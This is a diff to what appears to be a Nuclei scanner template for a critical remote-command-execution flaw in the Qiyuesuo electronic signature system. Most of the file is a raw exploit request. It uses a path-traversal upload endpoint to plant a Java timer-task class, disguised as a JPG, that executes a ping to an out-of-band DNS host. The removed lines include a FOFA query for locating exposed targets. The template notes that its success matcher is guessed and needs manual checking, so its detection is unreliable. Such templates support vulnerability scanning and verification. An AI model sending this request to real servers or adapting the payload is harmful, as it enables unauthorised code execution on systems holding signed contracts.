@@ -3,17 +3,11 @@ info:
   name: 契约锁电子签章系统任意命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gd1kgrfvgkeabqze
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gd1kgrfvgkeabqze
-    fofa: title="契约锁"&&title="电子签章"
 http:
 - raw:
-  - "POST /callback/%2E%2E;/code/upload HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R\n\n\n------WebKitFormBoundaryco2lQ5vxCOn9Aq2R\nContent-Disposition: form-data; name=\"type\";\n\nTIMETASK\n------WebKitFormBoundaryco2lQ5vxCOn9Aq2R\nContent-Disposition: form-data; name=\"file\";filename=\"qys.jpg\"\n\npackage qiyuesuo;\n\nimport com.qiyuesuo.utask.java.BaseTimerTask;\n\npublic class qiyuesuo004 extends BaseTimerTask {\n    static {try{Runtime.getRuntime().exec(\"ping dns.log.cn\");}catch (Exception e){}}\n}\n------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--"
+  - "POST /callback/%2E%2E;/code/upload HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R\n\n------WebKitFormBoundaryco2lQ5vxCOn9Aq2R\nContent-Disposition: form-data; name=\"type\";\n\nTIMETASK\n------WebKitFormBoundaryco2lQ5vxCOn9Aq2R\nContent-Disposition: form-data; name=\"file\";filename=\"qys.jpg\"\n\npackage qiyuesuo;\n\nimport com.qiyuesuo.utask.java.BaseTimerTask;\n\npublic class qiyuesuo004 extends BaseTimerTask {\n    static {try{Runtime.getRuntime().exec(\"ping dns.log.cn\");}catch (Exception e){}}\n}\n------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--"
   redirects: false
   matchers:
   - status:
